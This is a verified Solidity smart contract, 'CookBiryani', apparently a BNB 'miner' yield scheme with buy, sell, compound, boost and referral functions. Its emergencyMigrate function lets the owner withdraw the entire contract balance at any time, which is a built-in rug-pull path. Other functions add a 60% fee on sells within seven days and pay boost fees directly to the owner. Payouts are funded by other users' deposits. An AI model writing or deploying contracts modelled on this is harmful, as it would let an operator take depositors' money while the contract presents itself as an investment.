/**
 *Submitted for verification at BscScan.com on 2022-04-30
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }

    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract CookBiryani is Context, Ownable  {

    uint256 private constant NUM_PER_MINER = 864000;
    uint256 private constant PSN = 10000;
    uint256 private constant PSNH = 5000;
    uint256 private constant START_TIME = 1652596200;
    uint256 private marketValue;
    
    bool private initialized = false;
    
    uint256 private constant FEE = 500;
    uint256 private constant FEE60 = 6000;
    uint256 private constant BOOST_FEE = 2000000000000000000 wei;

    address payable private recAdd;
    
    mapping (address => uint256) private miners;
    mapping (address => uint256) private claimed;
    mapping (address => uint256) private lastCompounded;
    mapping (address => address) private referrals;
    mapping (address => uint256) private deadline;


    error NotStarted(uint);

    modifier hasStarted() {
        if(block.timestamp < START_TIME) revert NotStarted(block.timestamp);
        _;
    }
    

    constructor() {
        recAdd = payable(msg.sender);
    }

    function seeding() public payable onlyOwner {
        require(marketValue == 0);
        initialized = true;
        marketValue = 86400000000;
    }

    function buy(address ref) public payable {
        
        
        uint256 initialPoints = calculateBuy(msg.value,(address(this).balance - msg.value));
        initialPoints = initialPoints-getFee(initialPoints);
        
        uint256 fee = getFee(msg.value);
        recAdd.transfer(fee);

        if(initialized){
            deadline[msg.sender] = block.timestamp + 7 days;
        } else {
            deadline[msg.sender] = START_TIME + 7 days;
        }
        

        // claim for user
        claimed[msg.sender] = claimed[msg.sender]+initialPoints;
        
        // claim for user's referer
         if(ref == msg.sender) {
            ref = recAdd;
        }
        if(referrals[msg.sender]==address(0)){
            referrals[msg.sender]=ref;
        }

        claimed[ referrals[msg.sender] ] = claimed[referrals[msg.sender]] + (initialPoints/8);
        compound();
    }

    function sell() public {
        require(initialized);

        uint256 points = getPoints(msg.sender);
        uint256 pointsValue = calculateSell(points);
        
        uint256 fee = getFee(pointsValue);
        uint256 fee60 = getFee60(pointsValue);
        
        claimed[msg.sender] = 0;
        lastCompounded[msg.sender] = block.timestamp;
        marketValue = marketValue+points;
        recAdd.transfer(fee);

        if(block.timestamp < deadline[msg.sender]){
            payable (msg.sender).transfer(pointsValue-fee60);
        } else {
            payable (msg.sender).transfer(pointsValue-fee);
        }

    }

    function compound() public {
        
        uint256 points = getPoints(msg.sender);
        uint256 newMiners = points/NUM_PER_MINER;
        
        miners[msg.sender] = miners[msg.sender]+newMiners;
        claimed[msg.sender] = 0;
        
        if(initialized){
            lastCompounded[msg.sender] = block.timestamp;
        } else {
            lastCompounded[msg.sender] = START_TIME;
        }
        
        deadline[msg.sender] = block.timestamp + 7 days;
        marketValue = marketValue + (points/5);
    }

    function boost() public payable {
        require(initialized);
        require(msg.value == BOOST_FEE, "Insufficient funds");
        payable(recAdd).transfer(msg.value);
        miners[msg.sender] = miners[msg.sender]+500;
    }

    function emergencyMigrate() public onlyOwner {
        recAdd.transfer(address(this).balance);
    }

    // Biryani PAX
    function getMyMiners(address adr) public view returns(uint256) {
        return miners[adr];
    }

    //rewards in BNB
    function getMyRewards(address adr) public view returns(uint256) {
        uint256 points = getPoints(adr);
        uint256 rewards = calculateSell(points);
        return rewards;
    }

    function calculateBuy(uint256 eth, uint256 contractBalance) private view returns(uint256) {
        return calculateTrade(eth, contractBalance, marketValue);
    }

    function calculateSell(uint256 points) private view returns(uint256) {
        return calculateTrade(points, marketValue, address(this).balance);
    }

    function calculateTrade(uint256 rt, uint256 rs, uint256 bs) private pure returns(uint256) {
        return (PSN * bs) / (PSNH + (((rs * PSN) + (rt * PSNH)) / rt));
    }

    function getFee(uint256 amount) private pure returns(uint256) {
        return amount * FEE / 10000;
    }

    function getFee60(uint256 amount) private pure returns(uint256) {
        return amount * FEE60 / 10000;
    }

    function getPoints(address adr) private view returns(uint256) {
        return claimed[adr] + getPointsSinceLastCompounding(adr);
    }
    
    function getPointsSinceLastCompounding(address adr) private view returns(uint256) {
        uint256 secondsPassed=min(NUM_PER_MINER, (block.timestamp-lastCompounded[adr]));
        return secondsPassed * miners[adr];
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

}